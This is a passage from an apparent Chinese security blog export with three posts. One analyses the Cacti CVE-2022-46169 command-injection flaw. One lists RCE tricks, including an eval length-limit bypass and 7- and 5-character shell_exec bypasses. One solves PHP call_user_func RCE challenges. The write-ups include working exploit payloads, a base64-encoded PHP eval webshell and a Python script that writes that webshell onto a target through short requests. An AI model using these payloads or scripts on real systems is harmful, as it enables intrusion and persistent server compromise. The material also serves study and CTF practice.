strlen($output);\n\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\t$output = 'U';\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t$return[$i]['value']         = $output;\n\t\t\t\t\t\t$return[$i]['rrd_name']      = $item['rrd_name'];\n\t\t\t\t\t\t$return[$i]['local_data_id'] = $local_data_id;\n\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase POLLER_ACTION_SCRIPT: /* script (popen) */\n\t\t\t\t\t\t$output = trim(exec_poll($item['arg1']));\n\n\t\t\t\t\t\tif (prepare_validate_result($output) === false) {\n\t\t\t\t\t\t\tif (strlen($output) > 20) {\n\t\t\t\t\t\t\t\t$strout = 20;\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t$strout = strlen($output);\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t$output = 'U';\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t$return[$i]['value']         = $output;\n\t\t\t\t\t\t$return[$i]['rrd_name']      = $item['rrd_name'];\n\t\t\t\t\t\t$return[$i]['local_data_id'] = $local_data_id;\n\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase POLLER_ACTION_SCRIPT_PHP: /* script (php script server) */\n\t\t\t\t\t\t$cactides = array(\n\t\t\t\t\t\t\t0 => array('pipe', 'r'), // stdin is a pipe that the child will read from\n\t\t\t\t\t\t\t1 => array('pipe', 'w'), // stdout is a pipe that the child will write to\n\t\t\t\t\t\t\t2 => array('pipe', 'w')  // stderr is a pipe to write to\n\t\t\t\t\t\t);\n\n\t\t\t\t\t\tif (function_exists('proc_open')) {\n\t\t\t\t\t\t\t$cactiphp = proc_open(read_config_option('path_php_binary') . ' -q ' . $config['base_path'] . '/script_server.php realtime ' . $poller_id, $cactides, $pipes);\n\t\t\t\t\t\t\t$output = fgets($pipes[1], 1024);\n\t\t\t\t\t\t\t$using_proc_function = true;\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t$using_proc_function = false;\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\tif ($using_proc_function == true) {\n\t\t\t\t\t\t\t$output = trim(str_replace(\"\\n\", '', exec_poll_php($item['arg1'], $using_proc_function, $pipes, $cactiphp)));\n\n\t\t\t\t\t\t\tif (prepare_validate_result($output) === false) {\n\t\t\t\t\t\t\t\tif (strlen($output) > 20) {\n\t\t\t\t\t\t\t\t\t$strout = 20;\n\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\t$strout = strlen($output);\n\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\t$output = 'U';\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t$output = 'U';\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t$return[$i]['value']         = $output;\n\t\t\t\t\t\t$return[$i]['rrd_name']      = $item['rrd_name'];\n\t\t\t\t\t\t$return[$i]['local_data_id'] = $local_data_id;\n\n\t\t\t\t\t\tif (($using_proc_function == true) && ($script_server_calls > 0)) {\n\t\t\t\t\t\t\t/* close php server process */\n\t\t\t\t\t\t\tfwrite($pipes[0], \"quit\\r\\n\");\n\t\t\t\t\t\t\tfclose($pipes[0]);\n\t\t\t\t\t\t\tfclose($pipes[1]);\n\t\t\t\t\t\t\tfclose($pipes[2]);\n\n\t\t\t\t\t\t\t$return_value = proc_close($cactiphp);\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\n\t\t\t\t\t$i++;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\tprint json_encode($return);\n}\n```\n\n我们真正的利用点就在这个函数里面\n\n![image-20250725192635117](cacti-CVE-2022-46169/image-20250725192635117.png)\n\n这里 我们需要get传参 `local_data_ids` ，`host_id`，`poller_id`，\n\n我们也可以发现，这里只有`local_data_ids` 后面加了s，大概率就是一个数组了，因为是复数嘛\n\n，`get_nfilter_request_var` 他这里获取好像也过滤了我们的 get传参，进入分析\n\n![image-20250725192854424](cacti-CVE-2022-46169/image-20250725192854424.png)\n\n很简单的一个函数\n\n看起来也并没有什么过滤\n\n![image-20250725193938615](cacti-CVE-2022-46169/image-20250725193938615.png)\n\n这里也成功的取到我们传入的参数\n\n![image-20250725194343369](cacti-CVE-2022-46169/image-20250725194343369.png)\n\n我们真正的执行语句就在这一句\n\n```\n$cactiphp = proc_open(read_config_option('path_php_binary') . ' -q ' . $config['base_path'] . '/script_server.php realtime ' . $poller_id, $cactides, $pipes);\n```\n\n他先读取配置里 PHP 解释器的路径，确保用正确的 PHP 二进制执行，然后与目标执行的 PHP 脚本路径进行拼接，然后又与 `$poller_id` 拼接，最终执行了我们的rce\n\n\n\n接下来我们倒着分析回去\n\n看看如何让他进入这个分支\n\n`POLLER_ACTION_SCRIPT_PHP` 想让他进入这个分支，\n\n![image-20250725202424473](cacti-CVE-2022-46169/image-20250725202424473.png)\n\n全局搜索发现这个的值为2\n\n所以说这里我们 需要找到对应的action = 2 的时候\n\n![image-20250725203039500](cacti-CVE-2022-46169/image-20250725203039500.png)\n\n往上发现，他这里的action 是通过items 这个值传入的\n\n也就是他会在数据库去查询，查询到这个action为2的\n\n才会进入我们想要的分支\n\n也就是说，我们需要控制 `host_id` 和`local_data_id` 这两个的值，让他代入去数据库中查询，精确查找出这个action=2，\n\n然后我们去 连接一下数据库查询一下 poller_item 这个字段\n\n![image-20250725203659403](cacti-CVE-2022-46169/image-20250725203659403.png)\n\n查询后发现，只有 id=6的时候这个action才是2\n\n所以这个时候，我们只需要拿出 `host_id` 和`local_data_id` 这两个的值\n\nhost_id = 1 \n\nlocal_data_id = 6\n\n![image-20250725203844668](cacti-CVE-2022-46169/image-20250725203844668.png)\n\n然后他就会进入这个进行循环，这时候这个action 就是2 ，也就成功进入了我们的分支\n\n![image-20250725204401780](cacti-CVE-2022-46169/image-20250725204401780.png)\n\n然后这里我们 local_data_ids 必须传入一个数组，不然他进这里这个循环就会报错\n\n所以这里我们传的`local_data_ids[0]=6`\n\n最后她走到我们的proc_open这里执行任意的函数，我们的rce 也生效了\n\n![image-20250725204554766](cacti-CVE-2022-46169/image-20250725204554766.png)\n\n![image-20250725204626198](cacti-CVE-2022-46169/image-20250725204626198.png)\n\n\n\n但是这里他没有回显\n\n我们继续深入研究一下，让他怎么才有回显\n\n#### 如何回显\n\n我们知道`proc_open` 这个函数 能通过管道来输出，输入\n\n![image-20250725211924880](cacti-CVE-2022-46169/image-20250725211924880.png)\n\n\n\n\n\n\n\n![image-20250725211846268](cacti-CVE-2022-46169/image-20250725211846268.png)\n\n这里正好他用fgets 从管道里面读取了1024个字节\n\n然后他就会进入\n\n`using_proc_function`\n\n 这个判断里面\n\n![image-20250725212101793](cacti-CVE-2022-46169/image-20250725212101793.png)\n\n`$output = trim(str_replace(\"\\n\", '', exec_poll_php($item['arg1'], $using_proc_function, $pipes, $cactiphp)));`\n\n\n\n这里他先用exec_poll_php 执行了一个php脚本\n\n然后str_replace 去除结果中的换行符（`\\n`），\n\ntrim去除前后空白字符（包括空格、制表符等）\n\n进入看看`exec_poll_php` 具体干了些什么\n\n![image-20250725215622178](cacti-CVE-2022-46169/image-20250725215622178.png)\n\n我们看到，他这里读了8192个字节，是否会将我们的执行结果也一起读出来呢？\n\n\n\n`prepare_validate_result`\n\n这个函数对`output` 做了过滤\n\n为false，就会直接将output 赋值为‘U’，所以我们要想办法绕过\n\n进入进行分析\n\n![image-20250725212656843](cacti-CVE-2022-46169/image-20250725212656843.png)\n\n这里他先去掉了首尾的 单引号，双引号，换行符，回车\n\n```\nif (is_numeric($result)) {\n\tdsv_log('prepare_validate_result','data is numeric');\n \treturn true;\n```\n\n这里他判断是否是纯数字，是就直接返回true，但是这里我们的$output不可能是纯数字，所以直接pass\n\n```\nelseif ($result == 'U') {\n\tdsv_log('prepare_validate_result', 'data is U');\n\treturn true;\n```\n\n这里他判断值是不是U，不可能，也pass\n\n```\nelseif (is_hexadecimal($result)) {\n\tdsv_log('prepare_validate_result', 'data is hex');\n\treturn hexdec($result);\n```\n\n这里看函数名像判断16进制，有可能，保留，（因为我们可以将输出结果通过管道符 转化为16进制）\n\n```\nelseif (substr_count($result, ':') || substr_count($result, '!')) {\n\t\t/* looking for name value pairs */\n\t\tif (substr_count($result, ' ') == 0) {\n\t\t\tdsv_log('prepare_validate_result', 'data has no spaces');\n\t\t\treturn true;\n```\n\n这里先判断是否包含冒号（:）或感叹号（!），\n\n在判断如果没有空格，就返回true，也有可能保留\n\n最后一个else 里面直接将非数字字符全部清除了，只保留数字，pass\n\n\n\n所以我们的目标就落在了\n\n`elseif (is_hexadecimal($result))`\n\n`lseif (substr_count($result, ':') || substr_count($result, '!')) { if (substr_count($result, ' ') == 0) {`\n\n这两个判断里面，先分析16进制\n\n![image-20250725213756651](cacti-CVE-2022-46169/image-20250725213756651.png)\n\n1.清洗输入\n\n`$hexstr = str_replace(array(' ', '-'), ':', trim($result));`\n\n他先将输入字符串中的 空格和中划线（如 `\"00-1A-2B\"` 或 `\"00 1A 2B\"`）统一转换为 冒号分隔（如 `\"00:1A:2B\"`）。\n\n并用 `trim` 去除前后空白字符。\n\n2.按冒号分隔为数组\n\n`$parts = explode(':', $hexstr);`\n\n将统一格式的字符串切成数组\n\n例如输入 `\"00:1A:2B:3C:4D:5E\"` → `[\"00\", \"1A\", \"2B\", \"3C\", \"4D\", \"5E\"]`\n\n3.逐个检查每段是否为合法的两位十六进制数\n\n`foreach($parts as $part) {`\n\t`if (strlen($part) != 2) return false;`\n\t`if (ctype_xdigit($part) == false) return false;`\n`}`\n\n每段必须是 长度为 2 的字符串，例如 `\"0F\"`, `\"1a\"`。\n\n必须全部是 十六进制字符（0-9, A-F, a-f），否则返回 `false`。\n\n所有部分都符合条件，返回 `true`，表示是合法的十六进制格式。\n\n然后我们就要想办法 如何将输出的结果转换为 类似于mac地址这种的格式\n\n问问大模型，给了4种方法\n\n1. 使用 `xxd` + `sed` 或 `awk`（处理二进制/十六进制数据）\n\n   `echo -n \"abcdef\" | xxd -p | sed 's/\\(..\\)/\\1:/g; s/:$//'`\n\n   ![image-20250725214705152](cacti-CVE-2022-46169/image-20250725214705152.png)\n\n   本地测试有效果\n\n   ![image-20250725214725146](cacti-CVE-2022-46169/image-20250725214725146.png)\n\n   docker环境内显示没有xdd，所以这个有可能可以用\n\n2. 使用 `hexdump`\n\n   `echo -n \"abcdef\" | hexdump -v -e '1/1 \"%02x:\"' | sed 's/:$//'`\n\n   这个跟上面的一样，也有可能环境中没有这个命令\n\n3. 用 `xxd` 处理文件并转换格式\n\n   `xxd -p /bin/ls | tr -d '\\n' | sed 's/\\(..\\)/\\1:/g; s/:$//'`\n\n   pass，跟第一种差不多\n\n4. 用 Bash + printf\n\n   `hex=\"001a2b3c4d5e\"`\n   `echo \"$hex\" | sed 's/../&:/g; s/:$//'`\n\n   第四种直接pass，因为我们不能保证原文本就是十六进制的字符串\n\n\n\n所以我们找到了两种有效的方式，可以转16进制\n\n\n\n然后分析下\n\n```\nelseif (substr_count($result, ':') || substr_count($result, '!')) {\n\t\t/* looking for name value pairs */\n\t\tif (substr_count($result, ' ') == 0) {\n\t\t\tdsv_log('prepare_validate_result', 'data has no spaces');\n\t\t\treturn true;\n```\n\n如何让我们的输出包含`：`或者`！` 且还没有空格呢？\n\n第一个判断很好绕过，我们直接传一个冒号或者感叹号就行。\n\n第二个也很好想到，通过base64编码。\n\n问了问大模型\n\n1. 使用 `tr` 删除所有空格\n\n```\n|echo \"test\\r\\n :`id | tr -d ' '`\";\n转一下 urlencode\n%7Cecho%20%22test%5Cr%5Cn%20:%60id%20%7C%20tr%20-d%20'%20'%60%22;\n```\n\n![image-20250725225350740](cacti-CVE-2022-46169/image-20250725225350740.png)\n\n成功\n\n\n\n2. 使用 `sed` 删除所有空格字符\n\n   ```\n   echo \"test\\r\\n :`id | sed 's/ //g'`\";\n   转一下 urlencode\n   %7Cecho%20%22test%5Cr%5Cn%20:%60id%20%7C%20sed%20's/%20//g'%60%22;\n   ```\n\n   ![image-20250725225725218](cacti-CVE-2022-46169/image-20250725225725218.png)\n\n   没问题\n\n   \n\n3. 删除所有空白字符（包括空格、制表符、换行符）\n\n   ```\n   |echo \"test\\r\\n :`id | tr -d '[:space:]'`\";\n   |echo \"test\\r\\n :`id | sed 's/[[:space:]]//g'`\";\n   ```\n   \n   道理跟前两种差不多\n   \n   也可以执行，这里就不贴图了\n   \n4. base 64\n\n   ```\n   |echo \"test\\r\\n :`id | base64`\";\n   ```\n\n   ![image-20250725230541249](cacti-CVE-2022-46169/image-20250725230541249.png)\n\n   ![image-20250725230549777](cacti-CVE-2022-46169/image-20250725230549777.png)\n\n   成功\n\n\n\n#### 总结\n\nrce 执行归结于 `proc_open`函数  他直接进行了拼接，且未对我们用户的输入做过滤，导致了rce\n\n鉴权函数也可以优化，最简单的方法就是改变一下那个数组的顺序，将用户不能控制的ip放在最前面，让他循环一次就会直接判断\n\n而且他这个回显的过滤也很好绕过。\n\n但是终归还是没对用户的输入做过滤\n","tags":["RCE","代码审计"],"categories":["web安全"]},{"title":"rce的一些奇技淫巧","url":"/2025/07/23/rce的一些奇技淫巧/","content":"\nEVAL长度限制突破技巧\n\n<!--MORE-->\n\n\n\n##### PHP Eval函数参数限制在16个字符的情况下，如何拿到Webshell？\n\n源码\n\n```\n<?php\n$param = $_REQUEST['param'];\nif (\nstrlen($param) < 17 && stripos($param, 'eval') === false && stripos($param, 'assert') === false\n) \n{\neval($param);\n}\n```\n\n![image-20250723172109903](rce的一些奇技淫巧/image-20250723172109903.png)\n\n这里其实很容易想到利用`$_GET[1]` \n\npayload\n\n```\n?param=echo%20`$_GET[1]`;&1=whoami\n```\n\n![image-20250723173601674](rce的一些奇技淫巧/image-20250723173601674.png)\n\n还有一种方法呢就是利用exec\n\n```\n?param=exec($_GET[1]);\n```\n\n其实核心都是`$_GET[1]`\n\n这里还有另一种解法，利用文件包含\n\n![image-20250723174057360](rce的一些奇技淫巧/image-20250723174057360.png)\n\n###### 远程文件包含的利用\n\n`include$_GET[1];`也是可以运行的，中间的空格可以不要。\n\n这也是一个思路，但限制就是需要开启远程文件包含，但这个选项默认是关闭的。\n\n###### 本地文件包含的利用\n\n那么，文件包含真的不行么？\n\n有一种思路，利用file_put_contents可以将字符一个个地写入一个文件中，大概请求如下：\n\n```\nparam=$_GET[a](N,a,8);&a=file_put_contents\n```\n\nfile_put_contents的第一个参数是文件名，我传入N。PHP会认为N是一个常量，但我之前并没有定义这个常量，于是PHP就会把它转换成字符串'N'；第二个参数是要写入的数据，a也被转换成字符串'a'；第三个参数是flag，当flag=8的时候内容会追加在文件末尾，而不是覆盖。【因为默认是0 ，0是覆盖，8是追加】\n\n开始测试\n\n结果发现\n\n![image-20250723175922187](rce的一些奇技淫巧/image-20250723175922187.png)\n\n权限不足，忘记改html为www:data,权限了\n\n执行\n\n```\nchown www-data:www-data /var/www/html\n```\n\n![image-20250723180024341](rce的一些奇技淫巧/image-20250723180024341.png)\n\n除了file_put_contents，error_log函数效果也类似。\n\n但这个方法有个问题，就是file_put_contents第二个参数如果是符号，就会导致PHP出错，比如`param=$_GET[a](N,<,8);&a=file_put_contents`。但如果要写webshell的话，“<”等符号又是必不可少的。\n\n那么我们每次向文件'N'中写入一个字母或数字，最后构成一个base64字符串，再包含的时候使用php://filter对base64进行解码即可。\n\n最后请求如下：\n\n```\n# 每次写入一个字符：PD9waHAgZXZhbCgkX1BPU1RbMV0pOw   //<?php eval($_POST[1]);\n# 最后包含\nparam=include$_GET[0];&0=php://filter/read=convert.base64-decode/resource=N\n```\n\n我们用蚁剑 连接试试\n\n![image-20250723180625969](rce的一些奇技淫巧/image-20250723180625969.png)\n\n成功getshell。\n\n然后这里看了P神的文章发现还可以利用以下几个方式\n\n###### 本地日志包含\n\n首先通过各种方法找到web日志，然后利用上面说的include的方式来包含之。\n\n```\nparam=include$_GET[a];&a=/home/u244201241/.logs/php_error.log\n```\n\n如果找不到web日志，利用条件竞争的方法，包含tmp文件也可以。\n\n\n\n###### 标准答案：利用变长参数特性展开数组\n\n变长参数是PHP5.6新引入的特性，文档在此： http://php.net/manual/zh/migration56.new-features.php\n\n和Python中的`**kwargs`，类似，在PHP中可以使用 `func(...$arr)`这样的方式，将`$arr`数组展开成多个参数，传入func函数。\n\n再结合回调后门，即可构造一个完美的利用，数据包如下：\n\n```\nPOST /test.php?1[]=test&1[]=var_dump($_SERVER);&2=assert HTTP/1.1\nHost: localhost:8081\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 22\n\nparam=usort(...$_GET);\n```\n\n效果图：\n\n[![14847507412871.jpg](rce的一些奇技淫巧/thum-77d21484750770.jpg)](https://www.leavesongs.com/content/uploadfile/201701/77d21484750770.jpg)\n\n大概过程就是，GET变量被展开成两个参数`['test', 'phpinfo();']`和`assert`，传入usort函数。usort函数的第二个参数是一个回调函数`assert`，其调用了第一个参数中的`phpinfo();`。修改`phpinfo();`为webshell即可。\n\n也就是我上一篇文章细致的研究过\n\n\n\n##### Linux命令**长**度限制在7个字符的情况下，如何拿到shell\n\n```\n在二进制漏洞利用中，某师傅遇到可控数据只有8字节的情况，去掉字符串尾的\\0，限制在7个字符。\n\n<?php\n$param = $_REQUEST['param']; \nif ( strlen($param) < 8 )\n{ \n     echo shell_exec($param);\n}\n```\n\n这里看了来自 @超威蓝猫 px1624 师傅的奇技淫巧。\n\n![image-20250723181230904](rce的一些奇技淫巧/image-20250723181230904.png)\n\n在Linux下 W>hp,可以直接写入文件名为hp的文件\n\n其实这里也可以不用w，直接 >hp,也可以，\n\n而且在Linux下 `ls -t` 这个可以安装时间顺序进行排序，也就是我们先创建的文件会排最下面，越晚创建的文件会排在最上面\n\n这里为什么要引入`\\` 呢？ 就是为了转义ls 的换行符，因为我们只能7个字符慢慢写，还没写完，所以引入转义字符，就可以接着写啦，\n\n这里我们也不能直接写入`<` 测试发现会报错\n\n![image-20250723182007487](rce的一些奇技淫巧/image-20250723182007487.png)\n\n```\necho PD9waHAgZXZhbCgkX1BPU1RbMV0pOw |base64 -d>c.php\n//<?php eval($_POST[1]);\n```\n\n我们来尝试写入这个命令\n\n因为先写的在最后面，所以我们要倒着写\n\n这里还是要注意权限的问题\n\n![image-20250723182500233](rce的一些奇技淫巧/image-20250723182500233.png)\n\n\n\n![image-20250723182940024](rce的一些奇技淫巧/image-20250723182940024.png)\n\n写入完毕\n\n```\nls -t>0\n```\n\n将他排序后的结果重定向给0\n\n然后执行\n\n![image-20250723184238033](rce的一些奇技淫巧/image-20250723184238033.png)\n\n![image-20250723184256399](rce的一些奇技淫巧/image-20250723184256399.png)\n\n![image-20250723184302522](rce的一些奇技淫巧/image-20250723184302522.png)\n\n连接也没有任何的问题\n\n\n\n##### 五字符\n\n5字符我们如何拿到webshell呢？\n\n源码\n\n```\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nif(strlen($_GET['cmd'])<=5 && !preg_match('/rm/',$_GET['cmd']))\n{\n    echo shell_exec($_GET['cmd']);\n}\n?>\n```\n\n这里其实我们也可以用刚刚7字符的思路\n\n通过 `>` 写入文件名来执行命令\n\n这里引入了一个新的参数 `ls -h` \n\n`-h参数以易读的方式显示文件或目录大小`\n\n就比如我们构建的 `ls -t > a`\n\n```\n>a\\>\n>t-\n>sl\n```\n\n![image-20250723201455590](rce的一些奇技淫巧/image-20250723201455590.png)\n\n因为ls是默认按照字母顺序来排序的，所以添上-h是为了让命令以正常的顺序运行\n\n所以这里我们 将 `>t-` 替换为 `>ht-`\n\n![image-20250723201648294](rce的一些奇技淫巧/image-20250723201648294.png)\n\nls写入文件中时，每个文件名都是单独一行，它会自动换行，有时会影响到我们的命令执行，而dir会把内容全部写入一行中，同时会自动补全空格\n\n例如\n\n![image-20250723201821161](rce的一些奇技淫巧/image-20250723201821161.png)\n\n这里还有一个知识点\n\n`*` 的用法\n\n在Linux中`*` 大家都知道可以作为通配符使用，但是他也可以作为 命令来执行\n\n比如\n\n![image-20250723202106910](rce的一些奇技淫巧/image-20250723202106910.png)\n\n这里 我们可以看到`* > v` 成功 将dir的结果重定向到v中了，这是为什么呢？\n\n查询资料后发现\n\n![image-20250723202340865](rce的一些奇技淫巧/image-20250723202340865.png)\n\n正好我们这里的第一个是dir\n\n我们还可以做一个测试\n\n追加一个 `>a` 这样第一个就不是dir了，也就可以看到是否是执行dir\n\n![image-20250723202446925](rce的一些奇技淫巧/image-20250723202446925.png)\n\n爆了a没找到，印证我们的看法\n\n然后我们继续\n\n```\n>dir\n每个都是一个文件\n>f\\>\n>ht-\n>sl\n*>v        \n>rev\n*v>a        \nsh a        最后用sh来执行命令\n```\n\n\n\n![image-20250723202611194](rce的一些奇技淫巧/image-20250723202611194.png)\n\n按道理来说，按照我们前面的想法，这里*应该匹配 dir，他为什么匹配到 rev了呢？\n\n我们可以设置一下，让shell，打印我们所执行的命令，看看他到底是匹配的什么\n\n`set -x` 执行这条命令\n\n![image-20250723203036906](rce的一些奇技淫巧/image-20250723203036906.png)\n\n确实是先匹配的rev 并执行的\n\n也就是说，形如*v 这样的 他会先将 符合 这个通配符的全部文件列出来，然后取第一个再进行命令执行\n\n\n\n接下来就可以开始拆分字符串了，第一种可以直接构造一句话木马,因为有`<,?`，需要将其进行base64转换，这样payload里就没有特殊字符了\n\n```\n写入一句话木马 直接写入 他转为base64编码\n<?php eval($_POST[1]);   base64:PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==\n构造\necho PD9waHAgZXZhbCgkX1BPU1RbMV0pOw|base64 -d>1.php\nsh f\n1.php 就是你的<?php eval($_POST[1]);\n```\n\n需要注意的是必须要将其中一个空格用`${IFS}`代替，否则会被'吃'掉一个空格\n\n这里有个小技巧，可以利用\n\n`echo 'PD9waHAgZXZhbCgkX1BPU1RbMV0pOw|base64 -d>1.php' | fold -w2 | sed 's/$/\\\\\\\\/'`\n\n直接拆分，只需要注意转义即可\n\n![image-20250723204523305](rce的一些奇技淫巧/image-20250723204523305.png)\n\n尝试写入\n\n我写了一个脚本，来增加我们写入的效率\n\n因为ls -t按时间先后顺序排序，所以需要倒置，同时加上`ls -ht > a`的构造\n\n这里要注意我们所传的值不能有重复的命名\n\n运行脚本\n\n完整的脚本\n\n```\nimport requests\nimport time\n# 目标 URL\nurl = \"http://192.168.197.134/rce/test.php?cmd=\"\npayload_lines = [\n    \">dir\",\n    \">f\\>\",\n    \">ht-\",\n    \">sl\",\n    \"*>v\",\n    \">rev \",\n    \"*v>a\",\n    \">p \",\n    \">ph\\\\\",\n    \">1.\\\\\",\n    \">\\>\\\\\",\n    \">-d\\\\\",\n    \">\\ \\\\ \",\n    \">64\\\\\",\n    \">se\\\\\",\n    \">ba\\\\\",\n    \">\\|\\\\ \",\n    \">Ow\\\\\",\n    \">0p\\\\\",\n    \">MV\\\\\",\n    \">Rb\\\\\",\n    \">U1\\\\\",\n    \">BP\\\\\",\n    \">X1\\\\\",\n    \">gk\\\\\",\n    \">bC\\\\\",\n    \">Zh\\\\\",\n    \">ZX\\\\\",\n    \">Ag\\\\\",\n    \">aH\\\\\",\n    \">9w\\\\\",\n    \">PD\\\\\",\n]\n# 逐个发送请求\nfor line in payload_lines:\n    full_url = url + line\n    try:\n        response = requests.get(full_url, timeout=5)\n        print(f\"[+] Sent: {line} => Status: {response.status_code}\")\n        # 可打印输出结果：print(response.text)\n    except Exception as e:\n        print(f\"[-] Failed to send {line}: {e}\")\n    time.sleep(0.5)  # 建议加间隔，避免过快触发异常\n\n```\n\n\n\n","tags":["RCE"],"categories":["web安全"]},{"title":"RCE 5道挑战题","url":"/2025/07/22/RCE-5道挑战题/","content":"\n\n\n问题：\n\n<!--more-->\n\n```\n<?php\n\n$action = $_GET['action'];\n$parameters = $_GET;\nif (isset($parameters['action'])) {\n    unset($parameters['action']);\n}\n$a = call_user_func($action, $parameters);\n```\n\n\n\n\n\n# web1\n\n```\n<?php\n\n$action = $_GET['action'];\n$parameters = $_GET;\nif (isset($parameters['action'])) {\n    unset($parameters['action']);\n}\n\n$a = call_user_func($action, ...$parameters);\n\n```\n\n\n\n我们现在虚拟机下部署一下环境\n\n分析\n\n这里我们可以很容易的关注到\n\n`...$parameters` 这是一个可变参数\n\n`call_user_func` 这是一个回调函数\n\n`unset` 这个函数去官网查查\n\n\n\n![image-20250722204842784](RCE-5道挑战题/image-20250722204842784.png)\n\n发现他能够销毁`$parameters` 中的`action` \n\n## 解法1\n\n我们试着传参\n\n```\n?action=system&0=id\n```\n\n![image-20250722205051183](RCE-5道挑战题/image-20250722205051183.png)\n\n成功执行了\n\n我们下断看一下，是什么流程\n\n![image-20250722205145800](RCE-5道挑战题/image-20250722205145800.png)\n\n我们传入的 两个参数都会被 `...$parameters` 这个可变参数接收 形成了数组，\n\n然后经过`unset($parameters['action']);` 会删除数组中的key是action的字段\n\n最后只剩下了id\n\n![image-20250722205339850](RCE-5道挑战题/image-20250722205339850.png)\n\n最后执行了我们的回调函数\n\n## 解法2\n\n```\n?action=usort&0[0]=system&0[1]=ls&1=call_user_func\n```\n\n这个解法的原理就是 因为`$parameters` 是可变参数，所以我们就可以利用他的特性\n\n`可变参数列表是指在函数的参数列表中使用省略号（…）来表示不定数量的参数。在函数中使用可变参数列表时，需要将该参数作为一个数组来处理`\n\n在看看官方文档`usort` 的定义\n\n![image-20250722210024191](RCE-5道挑战题/image-20250722210024191.png)\n\n我们可以看到他可以接收callback\n\n那么这个payload的利用方式就是，给action传入usort，然后给parameters 传入system，ls，all_user_func\n\nusort先给parameters数组排序，但是里面有callback，就会调用 all_user_func，然后all_user_func 又调用 system这个函数对ls做处理，最后达到了rce\n\n# web2\n\n```\n<?php\n\n$action = $_GET['action'];\n$parameters = $_GET;\nif (isset($parameters['action'])) {\n    unset($parameters['action']);\n}\n\ncall_user_func($action, $parameters)($_POST['a'])($_POST['b']);\n\n```\n\n这个代码我在linux上复现发现，无论我将php版本调到5.6 还是7.3，都无法访问，爆500错误\n\n然后我们尝试在代码前加入\n\n```\nini_set('display_errors', 1);\nini_set('display_startup_errors', 1);\nerror_reporting(E_ALL);\n```\n\n看看具体是什么原因的错误\n\n![image-20250723171004717](RCE-5道挑战题/image-20250723171004717.png)\n\n他这里报错原因就是我们没post传值\n\n我们在传值试试\n\n![image-20250723171056676](RCE-5道挑战题/image-20250723171056676.png)\n\n\n\n## 解法1\n\n```\n?action=current&a=current\npost:a[]=system&b=whoami\n```\n\n这道题的难点就在于\n\n`($_POST['a'])($_POST['b']);` 如何利用，因为php中根本就没有这种写法，我们就很容易想到，会不会是先执行`call_user_func` 然后又出现一个函数执行第一个post，最后在执行 最后一个post，这里通过payload，\n\n我们去官方文档查查 `current` 是个什么函数\n\n![image-20250722214732234](RCE-5道挑战题/image-20250722214732234.png)\n\n通过这个例子我们可以知道current就是 返回数组中的当前值\n\n我们给action传入current，parameters数组中又是current，所以经过call_user_func把current取出来了，\n\n就形成了current([system])(whoami)\n\ncurrent 又将system取出来\n\nsystem(whoami)\n\n然后执行了rce\n\n## 解法2\n\n```\n?action=Closure::fromCallable&0=Closure&1=fromCallable\npost:a=system&b=ls\n```\n\n第二个的解法思路也感觉跟解法1差不多，就是函数用的不一样，我们去查一下\n\n![image-20250722215610624](RCE-5道挑战题/image-20250722215610624.png)\n\n我们可以看到它可以将callback 转换为闭包（closure）对象\n\n也就是说，这里我们给cation传入的Closure::fromCallable，\n\n数组传入的是`[\"Closure\", \"fromCallable\"]`\n\n经过`call_user_func` 我们得到一个 `Closure` 对象，对应的是 `Closure::fromCallable` 这个函数本身的封装。\n\n然后由这个函数来执行post['a'] 就变成了system(ls)\n\n下面有一些实列能帮助我们理解\n\n### 将普通函数转换为闭包\n\n```\n<?Php\nfunction sayHello($name) {\n  return \"Hello, $name!\";\n}\n// 使用 Closure::fromCallable 将普通函数转换为闭包$closure = Closure::fromCallable('sayHello');\n// 调用闭包echo $closure('World'); // 输出：Hello, World!?>\n```\n\n\n\n### 将类方法转换为闭包\n\n```\n<?Php\n\nclass Greeter {\n  public function greet($name) {\n    return \"Greetings, $name!\";\n  }\n}\n$greeter = new Greeter();\n// 将实例方法转换为闭包$closure = Closure::fromCallable([$greeter, 'greet']);\n// 调用闭包echo $closure('Alice'); // 输出：Greetings, Alice!?>\n```\n\n\n\n### 将静态方法转换为闭包\n\n```\n<?Php\nclass StaticGreeter {\n  public static function greet($name) {\n    return \"Hello from static, $name!\";\n  }\n}\n// 将静态方法转换为闭包$closure = Closure::fromCallable(['StaticGreeter', 'greet']);\n// 调用闭包echo $closure('Bob'); // 输出：Hello from static, Bob!?>\n```\n\n\n\n### 将匿名函数转换为闭包\n\n虽然匿名函数本身已经是闭包，但 `Closure::fromCallable` 可以用来创建一个新闭包对象：\n\n```\n<?php\n$anonFunction` = `function($name) {\n  return \"Hi, $name!\";\n};\n// 将匿名函数转换为闭包$closure = Closure::fromCallable($anonFunction);\n// 调用闭包echo $closure('Charlie'); // 输出：Hi, Charlie!?>\n```\n\n\n\n### 使用可调用对象\n\n```\n<?phpclass CallableClass {\n  public function __invoke($name) {\n    return \"Invoked with $name!\";\n  }\n}\n$callableObject = new CallableClass();\n// 将可调用对象转换为闭包$closure = Closure::fromCallable($callableObject);\n// 调用闭包echo $closure('Dave'); // 输出：Invoked with Dave!?>\n```\n\n\n\n\n\n`Closure::fromCallable` 